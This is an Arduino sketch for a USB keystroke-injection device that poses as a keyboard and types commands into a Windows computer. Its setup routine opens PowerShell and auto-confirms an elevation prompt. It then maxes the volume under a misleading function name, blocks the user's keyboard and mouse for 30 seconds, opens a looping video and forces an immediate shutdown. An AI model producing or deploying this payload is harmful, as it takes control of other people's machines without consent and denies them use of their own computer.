#define KEY_LEFT_CTRL   0x01
#define KEY_LEFT_SHIFT  0x02
#define KEY_LEFT_ALT    0x04
#define KEY_LEFT_GUI    0x08
#define KEY_RIGHT_CTRL  0x10
#define KEY_RIGHT_SHIFT 0x20
#define KEY_RIGHT_ALT   0x40
#define KEY_RIGHT_GUI   0x80
#define KEY_RIGHT_ARROW 0x4F
#define KEY_LEFT_ARROW  0x50
#define KEY_DOWN_ARROW  0x51
#define KEY_UP_ARROW    0x52
#define KEY_ESC         0x29T
#define KEY_F1          0x3A
#define KEY_F2          0x3B
#define KEY_F3          0x3C
#define KEY_F4          0x3D
#define KEY_F5          0x3E
#define KEY_F6          0x3F
#define KEY_F7          0x40
#define KEY_F8          0x41
#define KEY_F9          0x42
#define KEY_F10         0x43
#define KEY_F11         0x44
#define KEY_F12         0x45
#define KEY_PRTSCR      0x46
#define KEY_SCRLK       0x47
#define KEY_PAUSE       0x48
#define KEY_DEL         0x4C
#define KEY_INS         0x49
#define KEY_END         0x4D
#define KEY_HOME        0x4A
#define KEY_PGDN        0x4E
#define KEY_PGUP        0x4B
#define KEY_BACKSPC     0x2A
#define KEY_TAB         0x2B
#define KEY_ENTER       0x28
#define KEY_SPC         0x2C
#define KEY_MUTE        0x7F
#define KEY_VOL_UP      0x80
#define KEY_VOL_DOWN    0x81
#define KEY_UNDERLINE   0x2D
#define KEY_PLUS        0x2E
#define KEY_NONE 0x37

uint8_t buf[8] = { 0 }; /* Keyboard report buffer */

void setup();
void loop();
void STRING(char *);
void DELAY(unsigned t);
void CTRL_ALT(char *c);
void ENTER();
void WINDOWS(char *c);
void CTRL_ALT_DEL();
void ALT_F2();
void TAB();

void setup() {
  Serial.begin(9600);
  DELAY(1000);
  WINDOWS("r");
  DELAY(100);
  STRING("powershell");
  ENTER();
  DELAY(3000);
  STRING("start-process PowerShell -verb runas");
  DELAY(300);
  ENTER();
  DELAY(2800);
  TAB();
  DELAY(300);
  TAB();
  DELAY(300);
  ENTER();
  DELAY(3000);
  STRING("Function Set-FullFPS");
  DELAY(300);
  ENTER();
  STRING("{");
  DELAY(300);
  ENTER();
  STRING("Param(");
  DELAY(300);
  ENTER();
  STRING("[Parameter(Mandatory=$true)]");
  DELAY(300);
  ENTER();
  STRING("[ValidateRange(0,100)]");
  DELAY(300);
  ENTER();
  STRING("[Int]");
  DELAY(300);
  ENTER();
  STRING("$fluid");
  DELAY(300);
  ENTER();
  STRING(")");
  DELAY(300);
  ENTER();
  STRING("$keyPresses = [Math]::Ceiling( $fluid / 2 )");
  DELAY(300);
  ENTER();
  STRING("$obj = New-Object -ComObject WScript.Shell");
  DELAY(300);
  ENTER();
  STRING("1..50 | ForEach-Object { $obj.SendKeys( [char] 174 ) }");
  DELAY(300);
  ENTER();
  STRING("for( $i = 0; $i -lt $keyPresses; $i++ )");
  DELAY(300);
  ENTER();
  STRING("{");
  DELAY(300);
  ENTER();
  STRING("$obj.SendKeys( [char] 175 )");
  DELAY(300);
  ENTER();
  STRING("}");
  DELAY(300);
  ENTER();
  STRING("}");
  DELAY(300);
  ENTER();
  STRING("New-Alias -Name \"ssv\" Set-FullFPS");
  DELAY(300);
  ENTER();
  //STRING("Set-SoundVolume 100");
  DELAY(300);
  ENTER();
  STRING("$code =");
  DELAY(300);
  STRING("\"[DllImport(\"\"user32.dll\"\")] public static extern bool BlockInput(bool fBlockIt);\"");
  ENTER();
  STRING("$buggedInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru");
  DELAY(300);
  ENTER();
  STRING("function Disable-buggedInput($seconds) {");
  DELAY(300);
  ENTER();
  STRING("      $buggedInput::BlockInput($true)");
  DELAY(300);
  ENTER();
  STRING("      Start-Sleep $seconds");
  DELAY(300);
  ENTER();
  STRING("      $buggedInput::BlockInput($false)");
  DELAY(300);
  ENTER();
  STRING("}");
  DELAY(300);
  ENTER();
  STRING("Set-FullFPS 100 | Disable-buggedInput -seconds 30 | Out-Null | start chrome \"https://www.youtube.com/embed/WXHMGGskF3Q?rel=0&autoplay=1&loop=1&list=PLSFKemkBCrt8wHz9zedRPKXMBvIYAmNDY\" | shutdown -s -t 1");
  DELAY(300);
  ENTER();
  //DELAY(1000);
  //WINDOWS("r");
  //DELAY(100);
  //STRING("cmd /c start chrome https://www.youtube.com/embed/L_B5kYSTK_Y?rel=0&autoplay=1");
  //ENTER();
  
}
  void loop() {

  }

  void ALT_F2() {
    buf[0] = KEY_LEFT_ALT;
    buf[2] = KEY_F2;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }

  void STRING(char *txt) {
    while (*txt) {
      if (*txt >= 'a' && *txt <= 'z') {
        buf[2] = *txt - 'a' + 4;
      }
      else if (*txt >= 'A' && *txt <= 'Z') {
        buf[0] = KEY_LEFT_SHIFT;

        buf[2] = *txt - 'A' + 4;
      }
      else if (*txt >= '0' && *txt <= '9') {
        if (*txt == '0') {
          buf[2] = *txt - 9;
        }
        else {
          buf[2] = *txt - 19;
        }
      }
      else if (*txt == ' ') {
        buf[2] = KEY_SPC;
      }
      else if (*txt == '&') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x23;
      }
      else if (*txt == '>') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_NONE;
      }
      else if (*txt == '<') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x36;
      }
      else if (*txt == '|') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x1e;
      }
      else if (*txt == '/') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x24;
      }
      else if (*txt == '\\') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x35;
      }
      else if (*txt == ';') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x36;
      }
      else if (*txt == '(') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x25;
      }
      else if (*txt == ')') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x26;
      }
      else if (*txt == '{') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x34;
      }
      else if (*txt == '}') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x31;
      }
      else if (*txt == '[') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x2f;
      }
      else if (*txt == ']') {
        buf[0] = KEY_RIGHT_ALT;
        buf[2] = 0x30;
      }
      else if (*txt == '-') {
        buf[2] = 0x38;
      }
      else if (*txt == '=') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x27;
      }
      else if (*txt == ':') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x37;
      }
      else if (*txt == '.') {
        buf[2] = 0x37;
      }
      else if (*txt == ',') {
        buf[2] = 0x36;
      }
      else if (*txt == '_') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x38;
      }
      else if (*txt == '+') {
        buf[2] = 0x30;
      }
      else if (*txt == '¿') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = KEY_PLUS;
      }
      else if (*txt == '?') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x2d;
      }
      else if (*txt == '$') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x21;
      }
      else if (*txt == '"') {
        buf[0] = KEY_LEFT_SHIFT;
        buf[2] = 0x1f;
      }
      else {
        buf[2] = KEY_NONE;
      }

      Serial.write(buf, 8);   // Send keypress
      buf[0] = 0;
      buf[2] = 0;
      Serial.write(buf, 8);   // Release key
      txt++;
    }
  }

  void DELAY(unsigned t) {
    delay(t);
  }

  void CTRL_ALT(char *c) {
    buf[0] = KEY_LEFT_CTRL + KEY_LEFT_ALT;
    buf[2] = c[0] - 'a' + 4;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }

  void WINDOWS(char *c) {
    buf[0] = KEY_LEFT_GUI;

    if (c[0] >= 'a' && c[0] <= 'z') {
      buf[2] = c[0] - 'a' + 4;
    }

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }

  void ENTER() {
    buf[2] = KEY_ENTER;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }

  void CTRL_ALT_DEL() {
    buf[0] = KEY_LEFT_CTRL + KEY_LEFT_ALT;
    buf[2] = 0x63;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }

  void TAB() {
    buf[2] = KEY_TAB;

    Serial.write(buf, 8);       // Send keypress
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);
  }
